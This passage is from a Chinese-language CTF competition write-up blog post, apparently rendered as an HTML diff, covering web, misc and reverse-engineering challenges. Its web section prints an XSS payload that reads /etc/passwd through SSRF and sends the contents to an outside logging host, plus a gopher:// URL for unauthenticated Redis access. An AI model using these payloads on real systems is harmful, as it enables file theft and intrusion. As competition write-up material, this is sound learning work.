<span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"url"</span> <span class="attr">aria-describedby</span>=<span class="string">"url"</span> <span class="attr">placeholder</span>=<span class="string">"URL"</span> <span class="attr">rows</span>=<span class="string">"10"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>看起來似乎就如同字面上意思，能發request的頁面</p>
+<p>試試看下面這種：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">xmlhttp=new XMLHttpRequest();</div><div class="line">xmlhttp.onreadystatechange=function()</div><div class="line">&#123;</div><div class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</div><div class="line">    &#123;</div><div class="line">        document.location='http://kaibro.tw/log.php?c='+btoa(xmlhttp.responseText);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xmlhttp.open("POST","request.php",true);</div><div class="line">xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");</div><div class="line">xmlhttp.send("url=file:///etc/passwd");</div></pre></td></tr></table></figure>
+<p>然後就成功讀檔了，看來這邊可以SSRF</p>
+<p>翻了一下，會發現FLAG藏在<code>/var/www/html/config.php</code></p>
+<p>然後，最後一題Redis就是單純改成用<code>gopher</code>去做未授權訪問</p>
+<p>類似這樣</p>
+<p><code>gopher://127.0.0.1:25566/_KEYS%2520*%250a_QUIT</code></p>
+<p><br></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Python2Easy"><a href="#Python2Easy" class="headerlink" title="Python2Easy"></a>Python2Easy</h3><h3 id="Python2Easy_3F"><a href="#Python2Easy_3F" class="headerlink" title="Python2Easy?"></a>Python2Easy?</h3><p>這兩題misc的話，一開始我們想說可以去hijack他import進來的東西</p>
+<p>可是secret.py不能讀寫，其他東西也改不到</p>
+<p>卡了一陣子</p>
+<p>後來才知道.pyc時間戳記相同時，會優先使用</p>
+<p>我們就可以去蓋掉<code>secret.pyc</code>來hijack</p>
+<p>時間戳記讓他跟leak出來的一樣</p>
+<p>這樣reload時可以蓋掉Key噴第一題flag，或是直接在secret.pyc執行任意指令</p>
+<p><br></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>Reverse主要是<a href="https://blog.jxcode.tw" target="_blank" rel="external">@JxCode</a>在解的</p>
+<p>我花比較多時間的，是在踩地雷那題</p>
+<h3 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h3><p>一開始scanf要打<code>&quot;zero&quot;</code></p>
+<p>然後call 要跳到<code>XDDD()</code></p>
+<p>環境變數要叫做<code>&quot;rockman&quot;</code></p>
+<p>繞過debugger偵測</p>
+<p>打開notepad</p>
+<p>然後它會把flag印在notepad上</p>
+<h3 id="MOSburger"><a href="#MOSburger" class="headerlink" title="MOSburger"></a>MOSburger</h3><p>輸入<code>money$</code></p>
+<p>跳出對話框寫</p>
+<p><code>Are you hungry? I&#39;ve brought you something from MOS burger. The binary flag in in it! :)</code></p>
+<p>輸入之後他在windows的%TEMP%\MOS_burger.txt寫東西</p>
+<p>內容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">----- .---- ----- ----- ----- .---- .---- ----- ----- .---- ----- ----- .---- .---- ----- ----- ----- .---- ----- ----- ----- ----- ----- .---- ----- .---- ----- ----- ----- .---- .---- .---- ----- .---- .---- .---- .---- ----- .---- .---- ----- .---- ----- ----- .---- ----- ----- .---- ----- ----- .---- ----- ----- .---- .---- .---- ----- .---- .---- ----- .---- .---- ----- .---- ----- ----- .---- ----- ----- ----- ----- ----- ----- .---- .---- ----- .---- .---- .---- ----- ----- .---- .---- ----- .---- .---- .---- .---- ----- .---- .---- .---- ----- .---- ----- ----- ----- ----- .---- ----- ----- ----- ----- ----- ----- .---- .---- ----- .---- ----- ----- ----- ----- .---- .---- .---- ----- .---- ----- .---- ----- .---- .---- ----- .---- .---- .---- ----- ----- .---- .---- ----- ----- .---- .---- .---- ----- .---- .---- .---- ----- ----- .---- ----- ----- .---- .---- .---- .---- ----- ----- .---- ----- ----- .---- .---- .---- ----- .---- ----- ----- ----- .---- ----- .---- ----- ----- ----- ----- .---- .---- .---- .---- .---- ----- .----</div></pre></td></tr></table></figure>
+<p>87%就是摩斯密碼：</p>
+<p><code>-----</code>=&gt;<code>0</code></p>
+<p><code>.----</code> =&gt; <code>1</code></p>
+<p>轉出來變<code>01000110010011000100000101000111011110110100100100100111011011010010000001101110011011110111010000100000011010000111010101101110011001110111001001111001001110100010100001111101</code></p>
+<p>接著轉成Ascii</p>
+<p>Ruby:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">data = <span class="string">"01000110010011000100000101000111011110110100100100100111011011010010000001101110011011110111010000100000011010000111010101101110011001110111001001111001001110100010100001111101"</span></div><div class="line">puts data.scan(<span class="regexp">/[01]&#123;8&#125;/</span>).map &#123; <span class="params">|e|</span> e.to_i <span class="number">2</span> &#125;.inject <span class="string">''</span>, &amp;<span class="symbol">:concat</span></div></pre></td></tr></table></figure>
+<p><code>FLAG{I&#39;m not hungry:(}</code></p>
+<h3 id="AEG"><a href="#AEG" class="headerlink" title="AEG"></a>AEG</h3><p>這題主要是隊友解的，我還沒看就解掉惹XD</p>
+<p>這題一開始連上去會出現一串hex字串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">a239030d04d6993e8afcc0201251d84712d6383bbe14b420a34d3e66d092b436c2d0393522b299a489f55ca37e1d5927454631c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05</div></pre></td></tr></table></figure>
+<p>接著印出連過去的binary的base64</p>
+<p>把binary抓下來看發現他會比對你的輸入是否跟他想要的一樣</p>
+<p>然後執行輸入的後半段 當作shellcode</p>
+<p><br></p>
+<p>比對後發現一開始吐的那串hex的前100個char就傳一樣的回去給他</p>
+<p>101個char以後的就是直接被當成shellcode執行</p>
+<p>但是101以後的那段他會打亂順序</p>
+<p>所以要從他給的base64的那個binary得知他怎麼打亂順序的</p>
+<p><br></p>
+<p>把他base64那串抓下來執行</p>
+<p>前一百個維持不變，後面幾個打01020304…這樣的字串下去，用gdb看他怎麼跳順序</p>
+<p>然後把shellcode改成他的順序送過去，就能執行任意shellcode拿shell惹</p>
+<h3 id="singlehell"><a href="#singlehell" class="headerlink" title="singlehell"></a>singlehell</h3><p>這題是打怪遊戲，可是怪物血量太多，手動不可能贏</p>
+<p>然後這題直接objdump或ida會爛掉</p>
+<p>我後來直接<code>strings ./client</code>發現最底下出現<code>UPX</code></p>
+<p>就猜他有upx殼</p>
+<p>由於沒脫過upx，谷歌一陣子之後</p>
+<p>才知道<code>upx -d ./client</code>就能直接脫光光了</p>
+<p>之後就能輕鬆Reverse了，把攻擊力改大，血量鎖死就能打死怪惹</p>
+<h3 id="MindSweeper"><a href="#MindSweeper" class="headerlink" title="MindSweeper"></a>MindSweeper</h3><p>看到這題，我一開始以為過關就會噴FLAG</p>
+<p>所以一開始還去找那種自動掃雷的外掛XD</p>
+<p>不過後來知道踩地雷裡面，有地雷跟沒地雷會用<code>0x8f</code>和<code>0x0f</code>來表示</p>
+<p>所以直接用CE去搜盤面，就可以找到當前盤面位址</p>
+<p>把其中一格改成<code>0x0f</code>，點擊下去就會過關了</p>
+<p>然後過關之後，就會發現下一關的地雷文字改變了</p>
+<p>可以推測一直過關下去，把全部文字Dump出來就能得到FLAG惹</p>
+<p>所以我另外搜了一下當前關卡數的count值</p>
+<p>直接修改它，就能到特定關卡數</p>
+<p>然後由前幾Bytes推測他應該是壓縮檔，原本想說手動踹一下</p>
+<p>但後來我跟了一下，有個地方做了一個比較</p>
+<p>比較相等就會彈出<code>Are u a hacker?o_O</code>之類的MessageBox</p>
+<p>然後遊戲就Over惹</p>
+<p>故可以推測這個比較的值是壓縮檔總長度</p>
+<p>看了一下，這個長度值居然10萬多，嚇到吃手手</p>
+<p>原本想說寫個程式跑完所有關卡，過程中用OCR讀</p>
+<p>但有10萬多個Bytes，一秒讀一個Bytes要讀一天以上R…</p>
+<p>所以後來就有點放棄這題惹QQ</p>
+<p>code太長，跟不太下去</p>
+<p><br></p>
+<h2 id="u7D50_u8AD6"><a href="#u7D50_u8AD6" class="headerlink" title="結論"></a>結論</h2><p>其實這場比賽第一天、第二天都打得還不錯</p>
+<p>大概都能維持在前十名上下</p>
+<p>可是第三天不知為啥一堆人突然爆衝= =</p>
+<p>一下子就被擠到1x名</p>
+<p>就連第二天還沒幾個人解掉的xssrf leak都突然一堆人解</p>
+<p>很好奇是真的那麼剛好最後一天大家突然都想到解法嗎QQ</p>
+<p>不過最主要還是只能怪自己太廢，平時練習不夠</p>
+<p>以Web來說平常練習太專注在後端安全，沒顧到前端QQ 這好像是我第一次打XSS題..</p>
+<p>以Pwn來說，寫shellcode的速度太慢，以致於老早就找到洞卻卡很久，少200分QQ</p>
+<p>以Reverse來說，對一堆太複雜的運算組語還是有點看不太下去，工具熟練度也不夠</p>
+<p>我會用力記得這次的教訓好好加強的QAQ</p>
+<p><br><br>還有一個很悲劇的點是</p>
+<p>因為是期末考的關係，基本上沒辦法跨校組隊，也不能組沒修課的</p>
+<p>所以也不能找自己平常一起打CTF的隊友組</p>
+<p>導致臨時組的隊友可能會的領域重複率太高</p>
+<p>結果比賽中可能一個人要負責很多個領域，沒辦法專注在自己強的領域QQ</p>
+<p>整體來說是個有點慘的一場比賽，也跟我想得一樣輸贏關鍵還是在Pwn</p>
+<p>不過也是有學到一些東西，很多有趣的題目</p>
+<p>如果加上Bingo那題的話，我們總共解了11題</p>
+<p>最後還是很感謝隊友~</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/16/DEFCON-CTF-2018-Qual/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          DEFCON CTF 2018 Qual和一些有趣題目
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/12/31/自己的Telegram-BOT自己寫/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">自己的Telegram BOT自己寫</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2023 KaiBro
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.1.6/require.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-61797645-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+  </div>
+</body>
+</html>
